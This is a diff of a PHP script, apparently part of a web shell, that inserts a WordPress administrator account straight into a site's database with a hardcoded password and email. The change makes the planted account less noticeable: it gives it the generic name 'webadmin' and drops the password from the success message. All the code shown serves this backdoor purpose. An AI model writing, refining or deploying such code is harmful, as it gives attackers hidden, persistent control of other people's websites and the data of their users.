@@ -304,7 +304,7 @@ if (isset($_POST['create_wp_admin'])) {
             $error_msg = "Koneksi gagal: " . mysqli_connect_error();
         } else {
             // Nilai admin yang akan dibuat
-            $admin_username      = 'rahman';
+            $admin_username      = 'webadmin';
             $admin_password_plain = 'xm4nxp1337';
             $admin_password      = md5($admin_password_plain); // MD5 sesuai referensi
             $admin_email         = 'rahmanganteng1337@proton.me';
@@ -326,7 +326,7 @@ if (isset($_POST['create_wp_admin'])) {
                 if (!mysqli_query($conn, $insert_meta)) {
                     $error_msg = "Error inserting usermeta: " . mysqli_error($conn);
                 } else {
-                    $success_msg = "Admin WordPress berhasil dibuat!<br>Username: <strong>{$admin_username}</strong> | Password: <strong>{$admin_password_plain}</strong>";
+                    $success_msg = "Admin WordPress berhasil dibuat!<br>Username: <strong>{$admin_username}</strong>";
                 }
             }
         }
